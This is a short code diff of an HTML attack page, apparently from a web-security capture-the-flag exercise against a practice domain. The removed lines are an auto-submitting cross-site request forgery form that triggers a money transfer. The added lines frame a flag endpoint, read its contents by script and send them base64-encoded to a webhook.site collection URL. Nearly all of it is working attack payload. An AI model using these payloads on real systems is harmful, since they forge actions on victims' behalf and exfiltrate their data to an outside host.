@@ -1,9 +1,15 @@
-<form method="POST" action="https://phish-me.quoccacorp.com/api/transfer" id="form">
-<input type="hidden" name="csrf_token" value="ODYwMA==">
-<input type="hidden" name="username" value="z5643027">
-<input type="hidden" name="amount" value="1">
-</form>
- 
+<html>
+<body>
+<iframe id="f" src="https://qb5-api.final.quoccacorp.com/flag?framing=ALLOW-FROM%20https://YOUR_GITHUB_PAGES_URL"></iframe>
 <script>
-document.getElementById("form").submit();
+setTimeout(()=>{
+  try {
+    var t = document.getElementById('f').contentDocument.body.innerText;
+    new Image().src='https://webhook.site/01b8bb5e-fd89-4518-a5f9-7cb1b674ce0d?d='+btoa(t);
+  } catch(e) {
+    new Image().src='https://webhook.site/01b8bb5e-fd89-4518-a5f9-7cb1b674ce0d?err='+e;
+  }
+},3000)
 </script>
+</body>
+</html>
